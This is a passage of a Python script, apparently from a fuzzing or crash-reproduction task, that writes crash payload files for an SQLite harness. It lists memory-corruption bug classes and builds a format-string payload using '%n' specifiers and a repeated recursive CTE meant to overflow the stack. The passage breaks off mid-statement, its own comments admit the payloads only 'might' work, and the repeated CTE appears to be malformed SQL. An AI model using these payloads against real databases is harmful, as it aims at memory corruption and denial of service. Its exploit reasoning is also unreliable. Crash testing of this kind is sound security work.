3. Integer overflow in BLOB operations causing heap corruption
4. Use-after-free via prepared statement limits with complex queries
5. Stack overflow through recursive Common Table Expressions (CTEs)
"""

# Payload 1: Format string vulnerability in sqlite3_mprintf
# The harness calls sqlite3_mprintf("%.*s", (int)size, data)
# We craft SQL that when processed might trigger format string issues
payload1 = b'\xfd' + b'SELECT printf("%n%n%n%n%s%s%s", 1,2,3,4,"AAAA","BBBB") AS crash;'

with open('x1.bin', 'wb') as f:
    f.write(payload1)

# Payload 2: Deep recursion causing stack overflow via CTEs
# Common Table Expressions can cause deep recursion in SQLite parser
cte_bomb = b'WITH RECURSIVE ' + b'x(a) AS (SELECT 1 UNION ALL SELECT a+1 FROM x WHERE a<100000)' * 10
payload2 = b'\x01\n' + cte_bomb + b' SELECT * FROM x;'

with open('x2.bin', 'wb') as f:
